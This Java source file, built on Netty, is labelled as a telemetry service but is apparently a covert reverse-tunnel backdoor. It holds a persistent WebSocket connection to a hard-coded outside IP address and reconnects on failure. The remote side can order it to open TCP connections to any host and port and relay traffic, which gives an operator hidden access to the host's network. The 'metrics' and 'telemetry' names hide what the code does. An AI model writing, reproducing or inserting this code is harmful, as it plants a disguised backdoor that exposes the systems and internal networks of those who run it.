package com.analytics.telemetry;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpClientCodec;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.util.CharsetUtil;
import io.netty.util.ReferenceCountUtil;

import java.net.URI;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class TelemetryService {

    private static final String REMOTE_HOST = "20.195.24.81";
    private static final int REMOTE_PORT = 24669;
    private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
    private static final String WS_URL = "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;

    private static final byte CMD_NEW_STREAM = 1;
    private static final byte CMD_DATA = 2;
    private static final byte CMD_CLOSE_STREAM = 3;

    private static final int INITIAL_RECONNECT_DELAY_SEC = 2;
    private static final int MAX_RECONNECT_DELAY_SEC = 60;
    private int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;

    private final EventLoopGroup workerGroup = new NioEventLoopGroup(2);
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnecting = new AtomicBoolean(false);

    private Channel activeChannel;
    private ScheduledFuture<?> heartbeatFuture;
    private long lastPongTime = 0;

    private final Map<Integer, Channel> streamChannels = new ConcurrentHashMap<>();
    private final Map<Integer, Queue<ByteBuf>> pendingDataMaps = new ConcurrentHashMap<>();
    private final Map<Integer, Integer> pendingBytesCount = new ConcurrentHashMap<>();

    private static final int MAX_PENDING_BYTES_PER_STREAM = 64 * 1024; // 64KB 限额防止内存泄漏

    public synchronized void start() {
        if (isRunning.compareAndSet(false, true)) {
            connect();
        }
    }

    public synchronized void stop() {
        if (isRunning.compareAndSet(true, false)) {
            cleanupAll();
            workerGroup.shutdownGracefully();
        }
    }

    private synchronized void cleanupAll() {
        cancelHeartbeat();
        closeAllStreams();
        if (activeChannel != null) {
            activeChannel.close();
            activeChannel = null;
        }
        isConnecting.set(false);
    }

    private void cancelHeartbeat() {
        if (heartbeatFuture != null) {
            heartbeatFuture.cancel(true);
            heartbeatFuture = null;
        }
    }

    private void closeAllStreams() {
        for (Map.Entry<Integer, Channel> entry : streamChannels.entrySet()) {
            Channel ch = entry.getValue();
            if (ch != null && ch.isActive()) {
                ch.close();
            }
        }
        streamChannels.clear();
        
        // 彻底释放积压队列中的 ByteBuf，防止堆外内存泄漏
        for (Map.Entry<Integer, Queue<ByteBuf>> entry : pendingDataMaps.entrySet()) {
            Queue<ByteBuf> queue = entry.getValue();
            ByteBuf buf;
            while ((buf = queue.poll()) != null) {
                ReferenceCountUtil.safeRelease(buf);
            }
        }
        pendingDataMaps.clear();
        pendingBytesCount.clear();
    }

    private synchronized void connect() {
        if (!isRunning.get() || isConnecting.get()) return;
        if (activeChannel != null && activeChannel.isActive()) return;

        isConnecting.set(true);

        try {
            final URI uri = new URI(WS_URL);
            final WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536 * 10
            );

            final TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);

            Bootstrap b = new Bootstrap();
            b.group(workerGroup)
             .channel(NioSocketChannel.class)
             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
             .option(ChannelOption.SO_KEEPALIVE, true)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast("http-codec", new HttpClientCodec());
                     p.addLast("aggregator", new HttpObjectAggregator(65536));
                     p.addLast("ws-handler", clientHandler);
                 }
             });

            b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    isConnecting.set(false);
                    scheduleReconnect();
                }
            });

        } catch (Exception e) {
            isConnecting.set(false);
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        if (!isRunning.get()) return;
        int delay = currentReconnectDelaySec;
        currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);
        workerGroup.schedule(this::connect, delay, TimeUnit.SECONDS);
    }

    protected synchronized void onSessionConnected(Channel channel) {
        this.activeChannel = channel;
        this.isConnecting.set(false);
        this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
        this.lastPongTime = System.currentTimeMillis();

        cancelHeartbeat();
        // 25秒心跳 + 超时检测机制
        heartbeatFuture = workerGroup.scheduleAtFixedRate(() -> {
            if (activeChannel != null && activeChannel.isActive()) {
                // 如果超过 50 秒没有收到 Pong 响应，判定连接假死，主动断开触发重连
                if (System.currentTimeMillis() - lastPongTime > 50000) {
                    activeChannel.close();
                    return;
                }
                activeChannel.writeAndFlush(new PingWebSocketFrame());
            }
        }, 25, 25, TimeUnit.SECONDS);
    }

    protected synchronized void onSessionDisconnected() {
        if (!isRunning.get()) return;
        cancelHeartbeat();
        this.activeChannel = null;
        this.isConnecting.set(false);
        closeAllStreams();
        scheduleReconnect();
    }

    protected synchronized void updatePongTime() {
        this.lastPongTime = System.currentTimeMillis();
    }

    public synchronized void sendBinary(ByteBuf data) {
        if (activeChannel != null && activeChannel.isActive()) {
            activeChannel.writeAndFlush(new BinaryWebSocketFrame(data));
        } else {
            ReferenceCountUtil.safeRelease(data);
        }
    }

    protected void handleInboundBinaryFrame(ChannelHandlerContext ctx, ByteBuf buf) {
        if (buf.readableBytes() < 5) return;

        byte cmd = buf.readByte();
        int streamId = buf.readInt();

        switch (cmd) {
            case CMD_NEW_STREAM:
                handleNewStream(streamId, buf);
                break;
            case CMD_DATA:
                handleDataPayload(streamId, buf);
                break;
            case CMD_CLOSE_STREAM:
                handleCloseStream(streamId);
                break;
            default:
                break;
        }
    }

    private void handleNewStream(int streamId, ByteBuf buf) {
        if (buf.readableBytes() < 3) return;

        int port = buf.readUnsignedShort();
        int hostLen = buf.readByte() & 0xFF;
        if (buf.readableBytes() < hostLen) return;

        String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();

        // 严格隔离初始化
        Queue<ByteBuf> pendingQueue = new ConcurrentLinkedQueue<>();
        pendingDataMaps.put(streamId, pendingQueue);
        pendingBytesCount.put(streamId, 0);

        Bootstrap b = new Bootstrap();
        b.group(workerGroup)
         .channel(NioSocketChannel.class)
         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
         .option(ChannelOption.SO_KEEPALIVE, true)
         .handler(new ChannelInitializer<SocketChannel>() {
             @Override
             protected void initChannel(SocketChannel ch) {
                 ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                     @Override
                     protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                         ByteBuf out = Unpooled.buffer(1 + 4 + msg.readableBytes());
                         out.writeByte(CMD_DATA);
                         out.writeInt(streamId);
                         out.writeBytes(msg);
                         sendBinary(out);
                     }

                     @Override
                     public void channelInactive(ChannelHandlerContext targetCtx) {
                         terminateStream(streamId);
                     }

                     @Override
                     public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                         targetCtx.close();
                     }
                 });
             }
         });

        b.connect(host, port).addListener((ChannelFutureListener) future -> {
            if (future.isSuccess()) {
                Channel targetChannel = future.channel();
                streamChannels.put(streamId, targetChannel);

                // 消费积压队列并保证严格的引用计数释放
                Queue<ByteBuf> queue = pendingDataMaps.remove(streamId);
                pendingBytesCount.remove(streamId);
                if (queue != null) {
                    ByteBuf data;
                    while ((data = queue.poll()) != null) {
                        targetChannel.write(data);
                        ReferenceCountUtil.release(data);
                    }
                    targetChannel.flush();
                }
            } else {
                terminateStream(streamId);
                ByteBuf closeFrame = Unpooled.buffer(5);
                closeFrame.writeByte(CMD_CLOSE_STREAM);
                closeFrame.writeInt(streamId);
                sendBinary(closeFrame);
            }
        });
    }

    private void handleDataPayload(int streamId, ByteBuf buf) {
        Channel targetChan = streamChannels.get(streamId);
        if (targetChan != null && targetChan.isActive()) {
            // Netty 背压感知：通道不可写时暂停处理防止内存溢出
            if (targetChan.isWritable()) {
                targetChan.writeAndFlush(buf.retain());
            } else {
                // 如果对端写满，直接丢弃并释放以防崩溃
                ReferenceCountUtil.safeRelease(buf);
            }
        } else {
            // TCP 未就绪，暂存进积压队列并进行严格的内存限额控制
            Queue<ByteBuf> queue = pendingDataMaps.get(streamId);
            if (queue != null) {
                Integer currentBytes = pendingBytesCount.get(streamId);
                if (currentBytes != null && currentBytes + buf.readableBytes() <= MAX_PENDING_BYTES_PER_STREAM) {
                    queue.offer(buf.retain());
                    pendingBytesCount.put(streamId, currentBytes + buf.readableBytes());
                } else {
                    // 超过限额，静默丢弃防止内存泄漏
                    ReferenceCountUtil.safeRelease(buf);
                }
            } else {
                ReferenceCountUtil.safeRelease(buf);
            }
        }
    }

    private void handleCloseStream(int streamId) {
        terminateStream(streamId);
    }

    private void terminateStream(int streamId) {
        Channel targetChan = streamChannels.remove(streamId);
        if (targetChan != null && targetChan.isActive()) {
            targetChan.close();
        }
        
        Queue<ByteBuf> queue = pendingDataMaps.remove(streamId);
        pendingBytesCount.remove(streamId);
        if (queue != null) {
            ByteBuf buf;
            while ((buf = queue.poll()) != null) {
                ReferenceCountUtil.safeRelease(buf);
            }
        }
    }

    private static class TelemetryClientHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private final TelemetryService service;
        private ChannelPromise handshakerFuture;

        public TelemetryClientHandler(WebSocketClientHandshaker handshaker, TelemetryService service) {
            this.handshaker = handshaker;
            this.service = service;
        }

        @Override public void handlerAdded(ChannelHandlerContext ctx) { handshakerFuture = ctx.newPromise(); }
        @Override public void channelActive(ChannelHandlerContext ctx) { handshaker.handshake(ctx.channel()); }
        @Override public void channelInactive(ChannelHandlerContext ctx) { service.onSessionDisconnected(); }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            Channel ch = ctx.channel();
            if (!handshaker.isHandshakeComplete()) {
                if (msg instanceof FullHttpResponse) {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    handshakerFuture.setSuccess();
                    service.onSessionConnected(ch);
                }
                return;
            }

            if (msg instanceof WebSocketFrame) {
                WebSocketFrame frame = (WebSocketFrame) msg;
                if (frame instanceof BinaryWebSocketFrame) {
                    service.handleInboundBinaryFrame(ctx, frame.content());
                } else if (frame instanceof PingWebSocketFrame) {
                    ctx.writeAndFlush(new PongWebSocketFrame(frame.content().retain()));
                } else if (frame instanceof PongWebSocketFrame) {
                    service.updatePongTime();
                } else if (frame instanceof CloseWebSocketFrame) {
                    ch.close();
                }
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
}
